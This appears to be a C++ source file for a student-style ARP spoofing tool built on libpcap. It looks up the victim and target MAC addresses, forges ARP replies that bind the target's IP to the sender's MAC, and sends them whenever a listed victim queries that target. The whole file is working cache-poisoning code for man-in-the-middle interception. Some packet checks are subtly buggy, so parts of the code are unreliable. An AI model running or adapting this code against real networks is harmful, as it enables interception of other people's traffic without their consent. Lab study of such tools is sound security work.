#include <cstdio>
#include <pcap.h>

#include <iostream>     
#include <cstring>       
#include <unistd.h>      
#include <sys/ioctl.h>   
#include <net/if.h>      
#include <arpa/inet.h>  
#include <netinet/in.h> 
#include <vector>

#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

std::string get_ip(const std::string& iface) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return "";

    struct ifreq ifr;
    std::strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ);
    if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
        close(fd);
        return "";
    }
    close(fd);

    struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
    return std::string(inet_ntoa(ipaddr->sin_addr));
}

std::string get_mac(const std::string& iface) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return "";

    struct ifreq ifr;
    std::strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
        close(fd);
        return "";
    }
    close(fd);

    unsigned char* mac = (unsigned char*)ifr.ifr_hwaddr.sa_data;
    char mac_str[18];
    std::snprintf(mac_str, sizeof(mac_str),
        "%02x:%02x:%02x:%02x:%02x:%02x",
        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return std::string(mac_str);
}

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

EthArpPacket construct_arp_req(Mac smac, Ip sip, Ip tip) {
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = smac;
	packet.arp_.sip_ = ntohl(sip);
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = ntohl(tip);

	return packet;
}	

EthArpPacket* arp_reply(pcap_t* pcap, Ip sip, Ip tip, uint16_t op) {
	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			break;
		}
		EthArpPacket* eth_arp_packet = (EthArpPacket*)packet;
		if (eth_arp_packet->eth_.type_ != htons(EthHdr::Arp)) continue; // ARP check
		if (eth_arp_packet->arp_.op_ != htons(op)) continue; // Reply check
		if (eth_arp_packet->arp_.sip_ != ntohl(sip)) continue; // sip check
		if (eth_arp_packet->arp_.tip_ != ntohl(tip)) continue; // tip check
		return eth_arp_packet;
	}
}

EthArpPacket construct_arp_reply(pcap_t* pcap, Mac my_mac, Mac victim_mac, Ip target_ip, Ip victim_ip) {
	EthArpPacket packet;

	packet.eth_.dmac_ = victim_mac;
	packet.eth_.smac_ = my_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = my_mac;
	packet.arp_.sip_ = ntohl(target_ip);
	packet.arp_.tmac_ = victim_mac;
	packet.arp_.tip_ = ntohl(victim_ip);

	return packet;
}

struct ArpPair{
	Ip victim_ip;
	Ip target_ip;
	Mac victim_mac;
	Mac target_mac;
	EthArpPacket spoof_packet;

	// Constructor
    ArpPair(Ip vip, Mac vmac, Ip tip, Mac tmac, const EthArpPacket& pkt)
        : victim_ip(vip), target_ip(tip), victim_mac(vmac), target_mac(tmac), spoof_packet(pkt) {}
};

std::vector<ArpPair> arp_pairs; 
int main(int argc, char* argv[]) {
	if ((argc - 2) % 2 != 0 || argc < 4) {
		usage();
		return EXIT_FAILURE;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

	//1. MyIP, MyMac, victim_ip, target_ip 설정
    std::string ip_str = get_ip(dev);
    std::string mac_str = get_mac(dev);
	Ip my_ip(ip_str);
	printf("My Ip: %s\n", std::string(my_ip).c_str());
    Mac my_mac(mac_str);
	printf("My Mac: %s\n", std::string(my_mac).c_str());

	for (int i = 2; i < argc; i += 2) {
		Ip victim_ip(argv[i]);
		Ip target_ip(argv[i + 1]);
		
		//2. ARP request
		//2-1. VictimIP에 ARP request
		EthArpPacket packet1 = construct_arp_req(my_mac, my_ip, victim_ip);
		int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet1), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		}
		Mac victim_mac = arp_reply(pcap, victim_ip, my_ip, ArpHdr::Reply)->arp_.smac_;
		printf("%s\n", std::string(victim_mac).c_str());
		
		//2-2. TargetIP에 ARP request
		EthArpPacket packet2 = construct_arp_req(my_mac, my_ip, target_ip);
		res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet2), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		}
		Mac target_mac = arp_reply(pcap, target_ip, my_ip, ArpHdr::Reply)->arp_.smac_;
		printf("%s\n", std::string(target_mac).c_str());
		
		EthArpPacket spoof_pkt = construct_arp_reply(pcap, my_mac, victim_mac, target_ip, victim_ip);
		
		//3. ARP reply 패킷 구성
    	arp_pairs.push_back({victim_ip, victim_mac, target_ip, target_mac, spoof_pkt});
	
	}

	//4. 패킷 잡으면서 검사 -> victim이 sip이면서 tip의 mac을 묻고 있다면? 패킷 전송
	while(true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		}

		EthArpPacket* recv = (EthArpPacket*)packet;

		if (recv->eth_.type_ != EthHdr::Arp) continue;
		if (recv->arp_.op_ != ArpHdr::Request) continue;

		Ip sip = ntohl(recv->arp_.sip_);
		Ip tip = ntohl(recv->arp_.tip_);

		for (const auto& arp_pair : arp_pairs) {
			if (sip == arp_pair.victim_ip && tip == arp_pair.target_ip){
				// 5. ARP reply 패킷 전송
				res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&arp_pair.spoof_packet), sizeof(EthArpPacket));
				if (res != 0) {
					fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(pcap));
				}
				printf("Sent Arp reply, %s -> %s\n", std::string(sip).c_str(), std::string(tip).c_str());
			}
		}
	}
	pcap_close(pcap);
}